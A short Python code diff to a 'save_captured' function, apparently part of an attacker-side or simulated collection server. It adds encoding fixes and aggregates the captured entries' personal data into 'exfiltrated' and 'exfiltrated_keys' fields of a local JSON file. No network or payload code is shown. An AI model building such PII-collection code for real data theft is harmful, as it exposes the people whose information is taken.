@@ -41,12 +41,26 @@ def save_captured(entry):
     existing = {"entries": []}
     if os.path.exists(CAPTURED_FILE):
         try:
-            with open(CAPTURED_FILE) as f:
+            with open(CAPTURED_FILE, encoding='utf-8') as f:
                 existing = json.load(f)
+                if not isinstance(existing, dict):
+                    existing = {"entries": existing}
         except Exception:
             pass
+    if "entries" not in existing:
+        existing["entries"] = []
+    
     existing["entries"].append(entry)
-    with open(CAPTURED_FILE, "w") as f:
+    
+    all_pii = {}
+    for e in existing["entries"]:
+        if "data" in e:
+            all_pii.update(e["data"])
+            
+    existing["exfiltrated"] = all_pii
+    existing["exfiltrated_keys"] = list(all_pii.keys())
+    
+    with open(CAPTURED_FILE, "w", encoding='utf-8') as f:
         json.dump(existing, f, indent=2)
 
 
